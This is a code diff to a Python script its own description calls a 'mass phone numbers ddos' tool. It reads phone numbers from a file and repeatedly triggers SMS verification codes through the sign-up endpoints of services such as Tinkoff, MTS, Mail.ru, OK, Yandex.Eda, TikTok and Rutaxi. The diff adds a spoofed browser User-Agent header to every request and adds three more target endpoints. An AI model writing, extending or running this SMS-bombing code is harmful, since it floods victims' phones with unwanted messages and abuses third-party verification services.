@@ -10,6 +10,10 @@ parser = argparse.ArgumentParser(description="Script for mass phone numbers ddos
 parser.add_argument('--phone', type=str, help="Path to file with phone numbers")
 args = parser.parse_args()
 
+headers={
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
+}
+
 if args.phone != None:
     fileName = args.phone
 
@@ -36,20 +40,20 @@ def attack():
             if _phone == "":
                 continue
             try:
-                req = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
-
+                req = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers=headers)
                 messagesSend+=1
                 print(f"[{messagesSend}] Tinkoff отправлен")
             except:
                 print("Tinkoff не отправле")
             try:
-                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
+                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone}, headers=headers)
+                
                 messagesSend += 1
                 print(f"[{messagesSend}] Sunlight отправлен")
             except:
                 print("Sunlight не отправлен")
             try:
-                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
+                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers=headers)
                 messagesSend += 1
                 print(f"[{messagesSend}] MTS отправлен")
             except:
@@ -57,7 +61,7 @@ def attack():
 
             try:
                 requests.post('https://cloud.mail.ru/api/v2/notify/applink',
-                              json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
+                              json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", }, headers=headers)
                 messagesSend += 1
                 print(f"[{messagesSend}] Mail.ru отправлен")
             except:
@@ -66,7 +70,7 @@ def attack():
             try:
                 requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                               data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
-                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=headers)
                 messagesSend += 1
                 print(f"[{messagesSend}] ICQ отправлен")
             except:
@@ -74,37 +78,49 @@ def attack():
 
             try:
                 requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                              data={"st.r.phone": "+" + _phone})
+                              data={"st.r.phone": "+" + _phone}, headers=headers)
                 messagesSend += 1
                 print(f"[{messagesSend}] OK отправлен")
             except:
                 print("OK не отправлен")
 
             try:
-                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
+                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/', headers=headers)
                 messagesSend += 1
                 print(f"[{messagesSend}] Citilink отправлен")
             except:
                 print("Citilink не отправлен")
 
             try:
-                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
+                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, headers=headers)
                 messagesSend += 1
                 print(f"[{messagesSend}] Youla отправлен")
             except:
                 print("Youla не отправлен")
 
-            # try:
-            #     messagesSend += 1
-            #     print(f"[{messagesSend}]  отправлен")
-            # except:
-            #     print(" не отправлен")
-            #
-            # try:
-            #     messagesSend += 1
-            #     print(f"[{messagesSend}]  отправлен")
-            # except:
-            #     print(" не отправлен")
+            try:
+                requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + _phone}, headers=headers)
+                messagesSend += 1
+                print(f"[{messagesSend}] Yandex.Eda отправлен")
+            except:
+                print("Yandex.Eda не отправлен")
+
+            try:
+                requests.post("https://m.tiktok.com/node-a/send/download_link",
+                              json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": _phone[1:],
+                              "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=headers)
+                messagesSend += 1
+                print(f"[{messagesSend}] TikTok отправлен")
+            except:
+                print("TikTok не отправлен")
+
+            try:
+                requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": _phone[1:], "c": "3"}, headers=headers)
+                messagesSend += 1
+                print(f"[{messagesSend}] Rutaxi отправлен")
+            except:
+                print("Rutaxi не отправлен")
+
             time.sleep(2)
 
 clearScrean()
